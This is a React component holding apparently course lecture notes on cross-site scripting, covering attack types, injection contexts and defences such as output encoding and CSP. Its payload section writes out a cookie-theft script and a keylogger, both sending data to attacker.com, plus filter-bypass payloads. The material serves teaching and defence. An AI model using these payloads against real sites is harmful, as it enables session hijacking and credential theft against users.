import { Callout, Table, SectionHeading, SubHeading, T, CodeBlock } from "@/components/ContentComponents";
import { slideReferences } from "@/lib/slide-references";

export default function XssContent() {
  const refs = slideReferences.xss;

  return (
    <div className="space-y-1 text-slate-700 leading-relaxed">

      <Callout type="info">
        Beginner mental model: XSS is not "the server gets hacked by JavaScript". It is a trust failure where a website causes <em>the victim&apos;s browser</em> to execute attacker-controlled code <em>as if that code belonged to the website</em>. The browser then grants that code the same origin-level privileges as the legitimate page.
      </Callout>

      <SectionHeading id="what-is-xss" slideRef={refs["what-is-xss"]}>What is XSS?</SectionHeading>
      <p>
        <strong>Cross-Site Scripting (XSS)</strong> is a client-side injection vulnerability where an attacker injects malicious scripts into web pages viewed by other users. The victim&apos;s browser executes the script in the context of the vulnerable website — giving the attacker the same privileges as that origin.
      </p>
      <p className="text-sm mt-2">
        OWASP&apos;s core description is useful here: untrusted data enters the application, and the application sends that data back to the browser without the right validation or output encoding. The browser cannot tell that the script is malicious because it appears to come from a trusted site.
      </p>
      <SubHeading>Why the browser obeys the payload</SubHeading>
      <p className="text-sm">
        Browsers enforce the <strong>Same-Origin Policy</strong>. That policy is designed to isolate one website from another. The problem in XSS is that the malicious code is no longer treated as &quot;another website&quot; at all. It is treated as part of the vulnerable origin, so it can read page data, act as the user, and send authenticated requests using that origin&apos;s cookies or tokens.
      </p>
      <Callout type="key">
        XSS is a <em>client-side</em> vulnerability. The server is the delivery mechanism; the browser is the execution environment. This is why the Same-Origin Policy matters.
      </Callout>
      <Callout type="info" title="Transcript Sidenote">
        The lecture explicitly connected XSS back to SQL injection by saying the underlying weakness is conceptually similar: <strong>data and instructions are not kept separate</strong>. In SQL injection, user data becomes part of a database query. In XSS, user data becomes executable browser-side script or markup.
      </Callout>
      <p className="text-sm">
        XSS is consistently in the OWASP Top 10. It can lead to session hijacking, credential theft, keylogging, defacement, or full account takeover.
      </p>

      <SectionHeading id="xss-types" slideRef={refs["xss-types"]}>Types of XSS</SectionHeading>

      <SubHeading>Reflected XSS (Non-Persistent)</SubHeading>
      <p className="text-sm">
        The payload is embedded in a URL or form input, sent to the server, and immediately echoed back in the HTTP response. The victim must click a crafted link.
      </p>
      <CodeBlock lang="Example URL">
        {`https://victim.com/search?q=<script>alert(document.cookie)</script>`}
      </CodeBlock>
      <p className="text-sm">The server renders: <T>{`You searched for: <script>alert(document.cookie)</script>`}</T> — script executes.</p>

      <SubHeading>Stored XSS (Persistent)</SubHeading>
      <p className="text-sm">
        The payload is stored in a database (e.g., a comment, profile field, forum post) and served to every user who views that content. No crafted link needed — every visitor is a victim.
      </p>
      <Callout type="info" title="Transcript Sidenote">
        The transcript gave useful historical context here: early web forums often allowed much more raw HTML-like user input than modern interfaces do. That made persistent XSS far easier because users could sometimes embed markup directly rather than being constrained to a tightly controlled rich-text editor.
      </Callout>
      <Callout type="danger">
        Stored XSS is the most dangerous variant. A single injection can affect every user of the application indefinitely.
      </Callout>

      <SubHeading>DOM-Based XSS</SubHeading>
      <p className="text-sm">
        The payload is processed entirely client-side by JavaScript. The server never sees the malicious input. It exploits insecure use of DOM APIs like <T>document.write()</T>, <T>innerHTML</T>, <T>location.hash</T>.
      </p>
      <CodeBlock lang="Vulnerable JavaScript">
        {`// Dangerous — directly injects URL fragment into page
document.getElementById("output").innerHTML = location.hash.slice(1);
// Attack URL: https://victim.com/page#<img src=x onerror=alert(1)>`}
      </CodeBlock>
      <SubHeading>Blind XSS</SubHeading>
      <p className="text-sm">
        <strong>Blind XSS</strong> is a practical real-world variant of stored XSS. The attacker submits a payload somewhere they cannot immediately see the result, such as a support form or admin review queue. Later, when a staff member views that data in a backend panel, the payload executes there. It is called &quot;blind&quot; because the attacker often learns of success indirectly, for example through an out-of-band callback.
      </p>

      <Table
        headers={["Type", "Delivery", "Persistence", "Victim Action"]}
        rows={[
          ["Reflected", "URL / form input echoed by server", "None", "Must click crafted link"],
          ["Stored", "Injected payload saved in DB", "Yes — survives server restart", "Visit any infected page"],
          ["DOM-Based", "Client-side JS processes URL/DOM", "None", "Must visit crafted URL"],
        ]}
      />

      <SectionHeading id="xss-payloads" slideRef={refs["xss-payloads"]}>Common Payloads</SectionHeading>
      <p className="text-sm">
        In practice, a payload has two jobs: first, prove execution; second, achieve a goal. A good tester starts with a harmless proof-of-concept like <T>alert(1)</T> and only then escalates to showing realistic impact such as credential theft, CSRF-like state change, or content spoofing.
      </p>

      <SubHeading>Basic Alert (PoC)</SubHeading>
      <CodeBlock lang="HTML">
        {`<script>alert(1)</script>
<script>alert(document.domain)</script>`}
      </CodeBlock>

      <SubHeading>Cookie Theft</SubHeading>
      <CodeBlock lang="JavaScript">
        {`<script>
  new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
</script>`}
      </CodeBlock>
      <p className="text-sm mt-2">
        The attacker runs a server that logs GET requests. The victim&apos;s cookies arrive as query parameters.
      </p>
      <Callout type="info" title="Transcript Sidenote">
        The lecture also paused to remind students that browser cookies are effectively <strong>key-value strings stored locally in the browser</strong>. That matters because <T>document.cookie</T> is not some magic authentication oracle; it is just exposing the cookie string associated with the current document origin.
      </Callout>
      <Callout type="info">
        <T>HttpOnly</T> cookies cannot be read by JavaScript (<T>document.cookie</T> won&apos;t return them), but the session is still potentially vulnerable to CSRF if not otherwise protected.
      </Callout>

      <SubHeading>Event Handler Payloads (No &lt;script&gt; tag)</SubHeading>
      <CodeBlock lang="HTML">
        {`<img src=x onerror="alert(1)">
<body onload="alert(1)">
<svg onload="alert(1)">
<input autofocus onfocus="alert(1)">
<a href="javascript:alert(1)">Click me</a>`}
      </CodeBlock>

      <SubHeading>Keylogger</SubHeading>
      <CodeBlock lang="JavaScript">
        {`<script>
  document.addEventListener("keypress", function(e) {
    fetch("https://attacker.com/log?k=" + e.key);
  });
</script>`}
      </CodeBlock>

      <SectionHeading id="xss-bypass" slideRef={refs["xss-bypass"]}>Filter Bypass Techniques</SectionHeading>
      <p className="text-sm">Filters typically block certain keywords or tags. Techniques to bypass them:</p>

      <SubHeading>Case Variation</SubHeading>
      <CodeBlock>{`<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>`}</CodeBlock>

      <SubHeading>HTML Entity Encoding</SubHeading>
      <CodeBlock>{`<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<!-- &#97; = 'a', &#108; = 'l', etc. — browser decodes before executing -->`}</CodeBlock>

      <SubHeading>URL Encoding</SubHeading>
      <CodeBlock>{`<a href="javascript:%61lert(1)">Click</a>
<!-- %61 = 'a' -->`}</CodeBlock>

      <SubHeading>Double Encoding</SubHeading>
      <CodeBlock>{`%253Cscript%253E  →  %3Cscript%3E  →  <script>`}</CodeBlock>

      <SubHeading>Unicode / Hex Encoding</SubHeading>
      <CodeBlock lang="JavaScript">{`<script>alert(1)</script>
<script>\x61lert(1)</script>`}</CodeBlock>

      <SubHeading>Breaking up Keywords</SubHeading>
      <CodeBlock lang="HTML">{`<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- If filter strips <script>, the result is a valid <script> tag -->`}</CodeBlock>

      <SubHeading>Null Bytes</SubHeading>
      <CodeBlock>{`<scri%00pt>alert(1)</scri%00pt>`}</CodeBlock>

      <Callout type="tip">
        In an exam: if <T>&lt;script&gt;</T> is filtered, try event handlers (<T>onerror</T>, <T>onload</T>, <T>onfocus</T>). If attributes are sanitised, try a different tag. Always check the encoding context first.
      </Callout>
      <Callout type="info" title="Transcript Sidenote">
        In the lecture walk-through of persistent XSS, the broken-image <T>onerror</T> pattern was used to make the teaching point that even a harmless-looking <T>alert</T> proves code execution. Once you can trigger that event, you can usually swap the alert for something more harmful.
      </Callout>

      <SectionHeading id="xss-context" slideRef={refs["xss-context"]}>Injection Contexts</SectionHeading>
      <p className="text-sm">Where your input lands determines which payload to use:</p>
      <p className="text-sm mt-2">
        This is the single most important practical rule in XSS. If you memorise payloads but ignore context, you will fail both labs and exams. First identify whether your input lands in HTML text, an attribute, a JavaScript string, a URL, or CSS. Only then choose a payload that breaks out correctly from that context.
      </p>

      <Table
        headers={["Context", "Example", "Payload Strategy"]}
        rows={[
          ["HTML content", `<p>USER_INPUT</p>`, `<script>...</script> or event handlers`],
          ["HTML attribute (unquoted)", `<div class=USER_INPUT>`, `close attr + inject: x onmouseover=alert(1)`],
          ["HTML attribute (quoted)", `<div class="USER_INPUT">`, `break quote: " onmouseover="alert(1)`],
          ["JavaScript variable", `var x = "USER_INPUT";`, `close string: "; alert(1); //`],
          ["URL href", `<a href="USER_INPUT">`, `javascript:alert(1)`],
          ["CSS", `style="color: USER_INPUT"`, `expression(alert(1)) (IE only)`],
        ]}
      />

      <SectionHeading id="xss-mitigation" slideRef={refs["xss-mitigation"]}>Mitigations</SectionHeading>
      <p className="text-sm">
        OWASP treats <strong>output encoding</strong> as the primary defence. Input validation is still useful, but it does not solve the core problem because valid-looking data can still become dangerous if it is inserted into the wrong output context without encoding.
      </p>

      <SubHeading>Output Encoding (Primary Defence)</SubHeading>
      <p className="text-sm">
        Encode user-controlled data before inserting it into HTML. Use context-appropriate encoding:
      </p>
      <Table
        headers={["Context", "Encoding"]}
        rows={[
          ["HTML body", "HTML entity encode: & → &amp; < → &lt; > → &gt;"],
          ["HTML attribute", "Attribute encode, always quote attributes"],
          ["JavaScript", "Unicode escape: \\uXXXX"],
          ["URL", "URL percent-encode"],
          ["CSS", "CSS escape: \\XXXXXX"],
        ]}
      />
      <p className="text-sm mt-2">
        Use established libraries: DOMPurify (client-side), OWASP Java Encoder, Microsoft AntiXSS.
      </p>

      <SubHeading>Content Security Policy (CSP)</SubHeading>
      <p className="text-sm">
        HTTP header that tells the browser which sources are trusted for scripts. Blocks inline scripts and restricts external sources.
      </p>
      <CodeBlock lang="HTTP Header">
        {`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'`}
      </CodeBlock>
      <Callout type="warning">
        CSP is a <em>defence-in-depth</em> measure, not a substitute for output encoding. A misconfigured CSP (e.g. allowing <T>unsafe-inline</T>) provides no protection.
      </Callout>

      <SubHeading>HttpOnly Cookie Flag</SubHeading>
      <p className="text-sm">
        Setting <T>HttpOnly</T> on session cookies prevents JavaScript from reading them via <T>document.cookie</T>. This stops the most common cookie-theft XSS attack.
      </p>

      <SubHeading>Input Validation</SubHeading>
      <p className="text-sm">
        Validate that input matches expected format (allowlist, not blocklist). Reject or sanitise unexpected characters. Do not rely on this alone — always output-encode as well.
      </p>
      <SubHeading>Safe design habits</SubHeading>
      <ul className="list-disc pl-5 space-y-1 text-sm">
        <li>Prefer frameworks and templating engines that encode output by default</li>
        <li>Avoid dangerous DOM sinks such as <T>innerHTML</T> when safer alternatives like <T>textContent</T> exist</li>
        <li>Treat all browser-visible user input as hostile until encoded for the exact context</li>
        <li>Use CSP as a damage-limiting layer, especially to block inline script execution where possible</li>
      </ul>

      <Callout type="tip">
        Defence order: (1) Output encode everything by default. (2) Use CSP as defence-in-depth. (3) Set HttpOnly on session cookies. (4) Validate input format at boundaries. Input sanitisation alone is not sufficient.
      </Callout>

    </div>
  );
}
